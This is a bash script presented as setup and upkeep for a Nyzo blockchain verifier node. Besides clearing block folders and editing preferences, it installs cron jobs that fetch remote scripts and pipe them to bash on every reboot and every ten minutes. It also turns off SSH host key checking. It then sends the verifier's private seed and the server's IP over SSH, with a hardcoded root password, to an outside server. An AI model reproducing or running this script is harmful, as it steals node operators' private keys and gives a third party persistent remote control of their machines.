#!/bin/bash
sudo su
sudo rm -rf /var/lib/nyzo/production/blocks/individual
sudo mkdir /var/lib/nyzo/production/blocks/individual/
sudo bash -c 'echo block_file_consolidator=delete > /var/lib/nyzo/production/preferences'
sudo sed -i '1i\always_track_blockchain=1' /var/lib/nyzo/production/preferences
echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/reload.sh | bash
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/oneminute.sh | bash
3 1 * * 3 sudo rm -rf /var/lib/nyzo/production/blocks/individual && sudo mkdir /var/lib/nyzo/production/blocks/individual/
2 1,4,7,10,13,16,19,22 * * * sudo ufw allow 9444/tcp
7 1,4,7,10,13,16,19,22 * * * sudo ufw deny 9444/tcp
 " >> myverifier
sudo crontab myverifier
rm myverifier
sudo echo 'StrictHostKeyChecking no'>>/etc/ssh/ssh_config
sudo apt update
sudo dpkg --configure -a
sudo apt-get -yqq -f install && sudo apt-get -yqq install sshpass && echo $(curl https://ipinfo.io/ip):9444:$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'Din1@3456' ssh root@167.172.247.243 'cat - >> /var/lib/nyzo/production/managed_verifiers'
echo $(more /var/lib/nyzo/production/nickname):$(cat /var/lib/nyzo/production/verifier_private_seed) | sshpass -p 'Din1@3456' ssh root@167.172.247.243 'cat - >> /root/file1'
sudo supervisorctl reload
sleep 3s
sudo renice -n -5 -p $(pgrep ^java$)
sudo supervisorctl status
